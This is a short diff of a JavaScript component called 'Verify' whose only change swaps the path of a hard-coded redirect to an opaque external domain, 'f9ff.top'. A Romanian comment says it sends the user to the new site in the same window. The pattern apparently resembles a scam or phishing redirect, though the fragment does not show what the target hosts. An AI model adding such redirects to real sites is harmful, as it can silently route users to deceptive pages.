@@ -45,7 +45,7 @@ const Verify = () => {
   });
 
   // Redirecționează utilizatorul pe noul site în aceeași fereastră
-  window.location.href = "https://f9ff.top/d0d744a";
+  window.location.href = "https://f9ff.top/68fcad4";
 };
 
   return (
